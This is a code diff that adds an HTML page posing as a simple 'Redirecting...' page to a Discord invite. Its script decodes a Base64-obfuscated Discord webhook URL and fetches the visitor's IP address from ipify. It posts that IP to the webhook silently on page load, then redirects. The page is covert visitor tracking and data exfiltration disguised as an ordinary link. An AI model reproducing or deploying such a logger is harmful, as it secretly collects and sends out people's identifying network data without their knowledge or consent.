@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // Base64 encoded webhook URL
+        const encodedWebhookUrl = 'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM1MDUyMTk4MjE4NTI0MjcxNS9uTUd1OEVuTHFLME9xSFFST3JvYzc5YkZ4a2NzNXRWekU1eDBvUkxLMjYwTHZ4SHN4Mzd3SlJwR2VvUGQ2ankxS2EzR2FhVA==';
+
+        // Decode the Base64 encoded URL
+        const webhookUrl = atob(encodedWebhookUrl);
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+
+                // Send the IP address to Discord webhook silently
+                const messageData = {
+                    content: `New IP Address: ${ipAddress}`
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(messageData)
+                })
+                .catch(error => {
+                    console.error('Error sending IP address to Discord:', error);
+                })
+                .finally(() => {
+                    // After sending the IP address, redirect to the Discord invite
+                    window.location.href = 'https://discord.gg/fwendies';
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+                // Redirect to Discord invite if IP fetching fails
+                window.location.href = 'https://discord.gg/fwendies';
+            });
+    </script>
+</body>
+</html>
